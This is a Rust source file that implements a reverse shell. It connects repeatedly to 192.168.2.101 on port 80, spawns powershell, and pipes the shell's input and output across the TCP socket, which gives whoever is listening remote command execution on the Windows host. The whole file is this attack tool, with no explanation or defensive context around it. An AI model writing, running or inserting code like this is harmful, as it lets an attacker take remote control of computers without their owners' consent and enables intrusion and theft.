use std::io::{BufRead, BufReader, LineWriter, Write};
use std::process::{Command, Stdio};
use std::net::TcpStream;


pub fn handler(mut subp: Command, mut stdout : LineWriter<TcpStream>, mut stdin : BufReader<TcpStream>) -> Result<(), Box<dyn std::error::Error>> {

    let mut buf = String::new();
    let mut subp = subp.stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().expect("subp");
    let process_in = subp.stdin.take().unwrap();
    let mut process_in = LineWriter::new(process_in);
    let process_out = subp.stdout.take().unwrap();
    let process_out = BufReader::new(process_out);

    std::thread::spawn(move || {
        loop {
            let _ = stdin.read_line(&mut buf);
            let _ = writeln!(process_in, "{}", buf);
        }
    });

    for line_result in process_out.lines(){
        match line_result {
            Ok(line) => {
                let _ = writeln!(stdout, "{}", line);
            },
            _ => continue
        }
    }

    Ok(())
}

fn main() {
    loop {
        let (mut writer, mut reader) = match TcpStream::connect("192.168.2.101:80") {
            Ok(stream) => (
                LineWriter::new(stream.try_clone().unwrap()),
                BufReader::new(stream),
            ),
            Err(_) => continue,
        };

        let subp  = Command::new("powershell");
        let thread = std::thread::spawn(move || handler(subp, writer, reader).unwrap_or(()));

        while !thread.is_finished() {}

        return;
    }

    /*


    while !thread.is_finished() {
        //println!("Waiting...");
        std::thread::sleep(Duration::from_secs(2));
    }
    */
}
